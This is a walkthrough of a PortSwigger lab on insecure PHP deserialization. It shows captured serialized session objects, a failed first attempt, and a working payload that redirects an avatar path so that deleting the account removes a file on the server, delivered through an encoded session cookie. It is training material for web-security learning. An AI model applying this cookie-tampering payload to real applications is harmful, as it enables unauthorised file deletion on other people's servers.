# [Lab: Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

## Lab

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

You also have access to a backup account: `gregg:rosebud`

## Analysis

function:

- upload avatar
- delete account

wiener:

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dc0uh8qjersfsyx9zn2mtcgny5gepzjm";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

gregg:

```php
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"dulh8rk4ksvlmij73645ldkaa9xx2b5z";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```

avatar is uploaded to `avatar_link`, when delete account, everything in `avatar_link` are deleted maybe.

first try:

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"t84jjbljdrmsp4jauf75sqwxvha1q43g";s:11:"avatar_link";s:6:"users/";}
```

- response:

  ```html
  <p class=is-warning>PHP Warning:  unlink(users/): Is a directory in /home/carlos/User.php on line 51
  PHP Fatal error:  Uncaught Exception: Could not delete users/ in /home/carlos/User.php:52
  Stack trace:
  #0 /home/carlos/User.php(41): User-&gt;rm(&apos;users/&apos;)
  #1 Command line code(5): User-&gt;delete()
  #2 {main}
  thrown in /home/carlos/User.php on line 52</p>
  ```

## Solutions

modify serialized object:

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"wxfwlethwsi9bjg7fgoy5x70nfdo8p03";s:11:"avatar_link";s:12:"./morale.txt";}
```

base64 encode and url encode, then paste it into the session cookie, delete account => lab solved

```http
POST /my-account/delete HTTP/1.1
Host: id.web-security-academy.net
Cookie: session=<@urlencode><@base64>O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"wxfwlethwsi9bjg7fgoy5x70nfdo8p03";s:11:"avatar_link";s:12:"./morale.txt";}
<@/base64><@/urlencode>
```
